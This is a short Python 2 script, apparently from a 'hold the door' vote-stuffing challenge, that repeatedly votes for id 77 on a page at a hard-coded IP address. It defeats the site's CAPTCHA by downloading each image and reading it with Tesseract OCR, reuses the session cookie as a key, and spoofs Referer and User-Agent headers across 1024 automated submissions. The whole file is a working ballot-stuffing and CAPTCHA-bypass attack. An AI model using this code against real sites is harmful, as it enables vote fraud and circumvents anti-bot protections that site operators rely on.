#!/usr/bin/python2
"""
This module votes for id 77 at given url by reading a captcha.
Ref: http://stackoverflow.com/questions/13137817/how-to-download-image-using-requests
"""
import requests
import shutil
from PIL import Image
import pytesseract


url = 'http://54.221.6.249/level3.php'
headers = {'Referer': url, 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)'}
payload = {'id': '77', 'holdthedoor': 'Submit+Query', 'key': '', 'captcha': ''}
for i in range(1024):
    cookies = requests.get(url).cookies
    req = requests.get('http://54.221.6.249/captcha.php', cookies=cookies, stream=True)
    if req.status_code == 200:
        with open('/tmp/img_file', 'wb') as f:
            req.raw.decode_content = True
            shutil.copyfileobj(req.raw, f)
    payload['captcha'] = pytesseract.image_to_string(Image.open("/tmp/img_file").convert("RGB"))
    payload['key'] = cookies['HoldTheDoor']
    requests.post(url, data=payload, headers=headers, cookies=cookies)
